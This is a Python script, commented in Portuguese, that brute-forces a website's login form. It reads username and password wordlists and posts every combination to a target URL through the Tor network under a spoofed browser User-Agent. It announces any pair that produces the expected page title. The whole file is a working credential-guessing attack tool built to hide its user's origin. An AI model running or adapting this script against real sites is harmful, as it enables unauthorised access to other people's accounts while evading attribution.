import time
import random
import requests
import requests
from bs4 import BeautifulSoup
import sys

#dominio do site/endereço 
page_title = ''
url = ''
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}


 #REDE TOR
proxies = {
    "http": "socks5h://127.0.0.1:9150",
    "https": "socks5h://127.0.0.1:9150"
}



def bpk(username, password):
    data = {'username' :username, 'password' :password}
    try:
        r = requests.post(
            url, # Site
            data=data,
            proxies=proxies,
            headers=headers,
            timeout=10
        )

        print("IP atual:")
        print(r.text)

    except Exception as erro:
        print("Erro no proxy:")
        print(erro)

    soup = BeautifulSoup(r.text, 'html.parser')
    if soup.title.text == page_title: #compara resposta esprada
        print('|===========================================================================|')
        print(f"        [+] Combinação encontrada com sucesso {username} : {password} [+]")
        print('|===========================================================================|')
        print('\n')
        sys.exit()
    else:
        pass
def main():
    user_input = str(input('Type username here if you have one, if not press enter >> ') or 'none') #pede para informar um user caso não "none"
    
    if user_input == 'none':        
        users = str(input('file with users >> '))# input wordlist user
        passwords = str(input('with passwords >> '))#input wordlist pass
        print('\n')   
        passwords = [w.strip() for w in open(passwords, 'r').readlines()] #abre o arquivo e le tudo com um loop
        users = [u.strip() for u in open(users, 'r').readlines()] #abre o arquivo e le tudo com um loop 
        user_index = 0
        pass_index = 0
        stop = 0
        while stop != len(users):        
            bpk(users[user_index], passwords[pass_index])        
            print(f'Tried with >> {users[user_index]} : {passwords[pass_index]} \n') # visivel para usuario ver qual credencial esta sendo testada      
            pass_index += 1        
            if pass_index == len(passwords):
                stop += 1
                pass_index = 0
                user_index += 1
    else:
        # Este else acontece quando o usuário especificou um nome de usuário        
        passwords = str(input('Specify a folder with passwords >> '))     
        passwords = [w.strip() for w in open(passwords, 'r').readlines()]
        for password in passwords:
            bpk(user_input, password)
            print(f'Tried with >> {user_input} : {password} \n')